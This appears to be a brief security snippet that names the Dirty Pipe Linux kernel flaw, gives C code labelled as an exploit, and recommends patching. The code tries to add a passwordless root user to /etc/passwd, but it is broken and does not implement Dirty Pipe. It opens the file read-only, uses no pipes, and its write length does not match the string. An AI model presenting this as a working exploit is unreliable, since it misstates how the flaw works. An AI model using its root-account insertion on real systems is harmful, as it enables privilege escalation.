Dirty Pipe exploits a flaw in Linux kernel page caching (`pipe_buffer.flags`). Exploit:
```c
#include <fcntl.h>
#include <unistd.h>
int main() {
    int fd = open("/etc/passwd", O_RDONLY);
    write(fd, "\nattacker::0:0::/:/bin/sh", 24); // Overwrite
    return 0;
}
```
Mitigation: Patch kernels (`sudo apt upgrade linux-image-generic`).

